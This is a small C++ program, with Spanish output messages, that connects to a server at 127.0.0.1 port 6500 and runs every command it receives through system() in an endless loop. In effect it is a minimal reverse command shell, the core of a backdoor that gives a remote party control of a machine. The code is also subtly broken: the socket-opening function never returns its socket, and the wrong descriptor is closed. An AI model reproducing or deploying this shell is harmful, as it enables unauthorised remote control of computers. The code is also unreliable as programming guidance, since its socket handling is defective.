#include <unistd.h>
#include <arpa/inet.h>
#include <iostream>
#include <string.h>
#include <stdlib.h>
#include <cerrno>

using namespace std;

int open_socket();

int main(){

    int bufsize = 2048;
    char comando [2048];
    const int port = 6500;
    int listener = open_socket();

    struct sockaddr_in server;
      server.sin_family = PF_INET;
      server.sin_port = ((in_port_t)htons(port));
      server.sin_addr.s_addr = inet_addr("127.0.0.1");

    int conectar = connect(listener,(struct sockaddr*)&server, sizeof(server));
    if (conectar < 0){
      cout << "Error al conectar.\n";
    }else{
      cout << "Conexion establecida.\n";
    }

    for(;;){

      cout << "\nServidor ";

        recv(listener, comando, bufsize, 0);
        cout << "ha ejecutado el comando: "<< comando << endl;
        system(comando);
        memset(comando, '\0', sizeof(comando));

    }

close(conectar);
cout << "\nConexion finalizada.\n";
}


int open_socket(){
  int socketcliente = socket(PF_INET, SOCK_STREAM,0);

  if(socketcliente == -1){								//Comprobacion de error
		cout << "Error al abrir el socket. " << strerror(errno) << endl;
	}
}
